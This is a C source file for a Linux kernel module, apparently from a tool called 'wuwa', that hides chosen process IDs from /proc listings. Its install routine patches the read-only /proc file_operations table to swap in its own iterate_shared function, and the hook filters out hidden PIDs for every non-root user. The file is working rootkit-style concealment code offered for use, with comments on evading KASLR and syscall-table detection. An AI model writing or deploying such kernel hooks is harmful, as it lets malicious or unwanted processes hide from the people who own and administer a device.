#include "wuwa_syshook.h"
#include "wuwa_hide.h"
#include "wuwa_utils.h"

#include <linux/cred.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
typedef bool hide_filldir_ret_t;
#define HIDE_FILLDIR_OK false
#define HIDE_FILLDIR_FULL true
#else
typedef int hide_filldir_ret_t;
#define HIDE_FILLDIR_OK 0
#define HIDE_FILLDIR_FULL 1
#endif
#include <linux/module.h>
#include <linux/spinlock.h>
#include <linux/uidgid.h>

/* VFS readdir hook for /proc pid hiding.
 *
 * Why not sys_call_table: on obscured OEM kernels the table is not
 * discoverable by content (no 400+ plain run anywhere; text unreadable
 * so targets can't be validated; KASLR re-slides every boot). The
 * file_operations of /proc need NO discovery: open /proc, read f_op,
 * swap one pointer. Narrower blast radius (/proc only, not every
 * filesystem), arch-independent (covers 32-bit readers too), no
 * KASLR dependence, no per-build data.
 *
 * Install is explicit via ioctl (userspace gates on CFI status first:
 * on enforcing kernels the indirect f_op call would trap, so install
 * is refused there by policy). The table write uses the guarded
 * RO-safe writer (verify-before-write, readback, exact restore).
 * rmmod always restores first (a dangling f_op pointer after unload
 * would panic the next /proc listing).
 */

typedef int (*iterate_shared_fn)(struct file *filp, struct dir_context *ctx);

struct hide_ctx {
    struct dir_context base;
    struct dir_context *orig;
};

static const struct file_operations *hooked_ops;
static iterate_shared_fn orig_iterate;
static int hook_active;
static DEFINE_SPINLOCK(syshook_lock);

static bool name_is_hidden_pid(const char *name, int namlen)
{
    unsigned long v = 0;
    int i;

    if (namlen <= 0 || namlen > 7)
        return false;
    for (i = 0; i < namlen; i++) {
        if (name[i] < '0' || name[i] > '9')
            return false;
        v = v * 10 + (unsigned int)(name[i] - '0');
    }
    return wuwa_hide_contains((pid_t)v);
}

static hide_filldir_ret_t hide_filldir(struct dir_context *ctx,
                                         const char *name, int namlen,
                                         loff_t offset, u64 ino,
                                         unsigned int d_type)
{
    struct hide_ctx *hc = container_of(ctx, struct hide_ctx, base);
    filldir_t orig_actor;
    hide_filldir_ret_t ret;

    (void)offset;
    (void)ino;
    (void)d_type;
    if (name_is_hidden_pid(name, namlen))
        return HIDE_FILLDIR_OK; /* skip: not emitted, iteration continues */
    orig_actor = hc->orig->actor;
    ret = orig_actor(hc->orig, name, namlen, offset, ino, d_type);
    return ret;
}

static int wuwa_iterate_shared(struct file *filp, struct dir_context *ctx)
{
    iterate_shared_fn orig;
    struct hide_ctx hc;
    int ret;
    bool held = false;

    orig = READ_ONCE(orig_iterate);
    if (!orig)
        return -ENOSYS;
    /* Root sees everything (debugging); everyone else gets filtered. */
    if (uid_eq(current_euid(), GLOBAL_ROOT_UID))
        return orig(filp, ctx);
    if (!try_module_get(THIS_MODULE))
        return orig(filp, ctx); /* teardown race: passthrough, never crash */
    held = true;
    hc.base = *ctx;
    hc.base.actor = hide_filldir;
    hc.orig = ctx;
    ret = orig(filp, &hc.base);
    ctx->pos = hc.base.pos;
    if (held)
        module_put(THIS_MODULE);
    return ret;
}

int wuwa_hide_install(void)
{
    struct file *f;
    const struct file_operations *ops;
    iterate_shared_fn orig;
    unsigned long flags;

    spin_lock_irqsave(&syshook_lock, flags);
    if (hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    spin_unlock_irqrestore(&syshook_lock, flags);

    /* Resolve the ops from a live open: no symbols, no scans, no tables,
     * no KASLR dependence. */
    f = filp_open("/proc", O_RDONLY | O_DIRECTORY, 0);
    if (IS_ERR(f))
        return PTR_ERR(f) < 0 ? (int)PTR_ERR(f) : -ENOENT;
    ops = f->f_op;
    filp_close(f, NULL);
    if (!ops || !ops->iterate_shared)
        return -ENOSYS;
    orig = ops->iterate_shared;

    spin_lock_irqsave(&syshook_lock, flags);
    if (hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    hooked_ops = ops;
    orig_iterate = orig;
    /* RO-safe write (guarded, verified, restored on exit/uninstall). */
    if (wuwa_table_write64((unsigned long)&ops->iterate_shared,
                           (unsigned long)wuwa_iterate_shared)) {
        hooked_ops = NULL;
        orig_iterate = NULL;
        spin_unlock_irqrestore(&syshook_lock, flags);
        return -EIO;
    }
    {
        iterate_shared_fn back = NULL;
        if (wuwa_safe_read64(&ops->iterate_shared,
                             (unsigned long *)&back) ||
            back != wuwa_iterate_shared) {
            wuwa_table_write64((unsigned long)&ops->iterate_shared,
                               (unsigned long)orig);
            hooked_ops = NULL;
            orig_iterate = NULL;
            spin_unlock_irqrestore(&syshook_lock, flags);
            return -EIO;
        }
    }
    hook_active = 1;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return 0;
}

int wuwa_hide_uninstall(void)
{
    unsigned long flags;
    const struct file_operations *ops;
    iterate_shared_fn orig;
    int bad = 0;

    spin_lock_irqsave(&syshook_lock, flags);
    if (!hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    ops = hooked_ops;
    orig = orig_iterate;
    if (wuwa_table_write64((unsigned long)&ops->iterate_shared,
                           (unsigned long)orig))
        bad = 1;
    else {
        iterate_shared_fn back = NULL;
        if (wuwa_safe_read64(&ops->iterate_shared,
                             (unsigned long *)&back) ||
            back != orig)
            bad = 1;
    }
    hooked_ops = NULL;
    orig_iterate = NULL;
    hook_active = 0;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return bad ? -EIO : 0;
}

int wuwa_hide_active(void)
{
    int a;
    unsigned long flags;

    spin_lock_irqsave(&syshook_lock, flags);
    a = hook_active;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return a;
}
